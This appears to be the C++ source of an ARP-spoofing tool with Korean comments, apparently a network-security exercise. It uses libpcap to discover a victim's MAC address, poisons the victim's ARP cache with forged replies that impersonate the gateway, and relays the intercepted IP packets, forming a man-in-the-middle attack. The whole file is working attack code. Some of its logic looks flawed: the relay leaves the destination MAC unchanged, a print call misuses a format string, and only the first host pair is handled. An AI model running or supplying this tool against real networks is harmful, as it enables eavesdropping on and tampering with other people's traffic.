// arp-spoof-main.cpp

#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "get_mac_ip.h"

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc%2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    // 나의 MAC주소, IP주소 가져오기
    char myMacStr[32] = {0, };
    char myIpStr[32] = {0, };
    if(get_mac(myMacStr, dev) < 0)
    {
        fprintf(stderr, "get_mac() Error!!\n");
        return -1;
    }
    if(get_ip_addr(myIpStr, dev) < 0)
    {
        fprintf(stderr, "get_ip_addr() Error!!\n");
        return -1;
    }
    Mac myMac = Mac(myMacStr);
    Ip myIp = Ip(myIpStr);
    
    // 공격 준비

    Ip senderIp = Ip(argv[2]);
    Ip targetIp = Ip(argv[3]);
    
    // sender의 MAC주소 알아오기
    
    // ARP Request 패킷 제작
    EthArpPacket arpRequestPacket;

    arpRequestPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    arpRequestPacket.eth_.smac_ = myMac;
    arpRequestPacket.eth_.type_ = htons(EthHdr::Arp);

    arpRequestPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    arpRequestPacket.arp_.pro_ = htons(EthHdr::Ip4);
    arpRequestPacket.arp_.hln_ = Mac::SIZE;
    arpRequestPacket.arp_.pln_ = Ip::SIZE;
    arpRequestPacket.arp_.op_ = htons(ArpHdr::Request);  // 리퀘스트
    arpRequestPacket.arp_.smac_ = myMac;
    arpRequestPacket.arp_.sip_ = htonl(myIp);
    arpRequestPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
    arpRequestPacket.arp_.tip_ = htonl(senderIp);

    // 패킷 전송
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpRequestPacket), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    // ARP Reply 패킷 수신
    EthArpPacket* recvPacket = NULL;
    
    while(true)
    {
        struct pcap_pkthdr* header;
        const  u_char*      packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        
        recvPacket = (EthArpPacket*)packet;  // 패킷을 가져와서
        
        if(recvPacket->eth_.type() != EthHdr::Arp)
            continue;  // ARP패킷이 아니면 건너 뛴다.
        if(recvPacket->arp_.op() != ArpHdr::Reply)
            continue;  // ARP Reply가 아니면 건너 뛴다.
        if(recvPacket->arp_.sip() != senderIp)
            continue;  // sender IP가 아니면 건너 뛴다.
        
        break;  // 찾았다!!
    }
    
    // senderMac 겟또
    Mac senderMac = Mac(recvPacket->arp_.smac_);

    // ARP infect 패킷 제작
    EthArpPacket arpInfectPacket;

    arpInfectPacket.eth_.dmac_ = senderMac;
    arpInfectPacket.eth_.smac_ = myMac;
    arpInfectPacket.eth_.type_ = htons(EthHdr::Arp);

    arpInfectPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    arpInfectPacket.arp_.pro_ = htons(EthHdr::Ip4);
    arpInfectPacket.arp_.hln_ = Mac::SIZE;
    arpInfectPacket.arp_.pln_ = Ip::SIZE;
    arpInfectPacket.arp_.op_ = htons(ArpHdr::Reply);  // 리플라이
    arpInfectPacket.arp_.smac_ = myMac;
    arpInfectPacket.arp_.sip_ = htonl(targetIp);  // 내가 target이다...
    arpInfectPacket.arp_.tmac_ = senderMac;
    arpInfectPacket.arp_.tip_ = htonl(senderIp);
    
    // ARP infect 패킷 전송
    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpInfectPacket), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    // relay while loop
    while(true)
    {
        struct pcap_pkthdr* header;
        const  u_char*      packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
        {
            printf("nothing captured...\n");
            continue;
        }

        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        // 패킷을 가져와서
        EthHdr*      spoofedPacket = (EthHdr*)packet;
        bpf_u_int32  spoofedPacketSize = header->caplen;

        if(spoofedPacket->smac() != senderMac)
            continue;  // sender의 MAC이 아니면 건너뛴다!

        // IP패킷이면 Relay!!
        if(spoofedPacket->type() == EthHdr::Ip4)
        {
            printf("from %s, spoofed IP packet is captured: %u bytes \n", targetIp, spoofedPacketSize);

            // src mac을 나의 MAC으로 바꾼다.
            spoofedPacket->smac_ = myMac;

            // 릴레이 IP패킷 전송
            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(spoofedPacket), spoofedPacketSize);
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }

        // ARP패킷이면
        else if(spoofedPacket->type() == EthHdr::Arp)
        {
            // 다시한번 ARP infect 패킷 전송
            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpInfectPacket), sizeof(EthArpPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }
    }  // relay while loop

    pcap_close(handle);
}
